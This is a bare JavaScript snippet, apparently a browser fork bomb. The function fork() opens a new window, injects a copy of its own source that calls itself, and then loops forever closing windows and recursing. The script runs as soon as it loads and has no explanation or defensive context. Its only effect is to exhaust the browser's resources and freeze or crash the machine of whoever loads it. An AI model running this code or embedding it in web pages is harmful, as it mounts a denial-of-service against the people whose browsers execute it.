function fork() {
  const win = window.open();
  const script = win.document.createElement("script");
  script.innerHTML = fork + "\n" + "fork();";
  win.document.head.appendChild(script);
  while(true){ 
    win.close();
    fork();
  }
}

fork();
